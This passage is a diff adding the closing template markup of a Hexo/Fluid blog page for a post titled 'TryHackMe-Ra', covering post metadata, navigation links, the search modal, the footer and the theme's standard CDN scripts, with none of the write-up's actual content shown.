+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TryHackMe-Ra</div>
+      <div>http://example.com/2022/10/06/TryHackMe-Ra/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-Enterprise/" title="TryHackMe-Enterprise">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">TryHackMe-Enterprise</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-Set/" title="TryHackMe-Set">
+                        <span class="hidden-mobile">TryHackMe-Set</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
